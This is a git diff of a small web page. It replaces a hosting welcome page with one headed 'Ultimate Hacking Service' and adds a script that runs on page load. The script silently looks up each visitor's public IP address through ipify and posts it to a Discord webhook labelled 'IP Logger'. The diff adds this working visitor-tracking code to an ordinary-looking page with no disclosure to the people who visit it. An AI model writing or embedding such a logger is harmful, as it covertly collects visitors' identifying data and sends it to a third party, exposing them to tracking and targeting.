@@ -1,5 +1,45 @@
 <hr>
-<h1>Welcome To Cool Site Hosting!</h1>
-<h3>Contact me to sign up for a free website!<h3>
-<p>User on Discord: thegamedevelopernoob</p>
-<img src="hi.png" alt="" width="500" height="600">
+<h1>Welcome To The Ultimate Hacking Service!</h1>
+<script>
+  // Replace with your Discord webhook URL
+const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+// Function to fetch the IP address and send it to the webhook
+async function sendIPToDiscord() {
+  try {
+    // Fetch the IP address from a third-party API (e.g., ipify.org)
+    const ipResponse = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipResponse.json();
+    const ipAddress = ipData.ip;
+
+    // Construct the payload for the Discord webhook
+    const payload = {
+      username: "IP Logger", // Customize the webhook's displayed name
+      embeds: [
+        {
+          title: "New IP Address Detected",
+          description: `IP Address: \`${ipAddress}\``,
+          color: 0x00ff00, // Green color for the embed
+        },
+      ],
+    };
+
+    // Send the payload to the Discord webhook
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
+    });
+
+    console.log("IP address sent to Discord webhook successfully!");
+  } catch (error) {
+    console.error("Error sending IP to Discord webhook:", error);
+  }
+}
+
+// Call the function to send the IP address when the page loads
+sendIPToDiscord();
+
+</script>
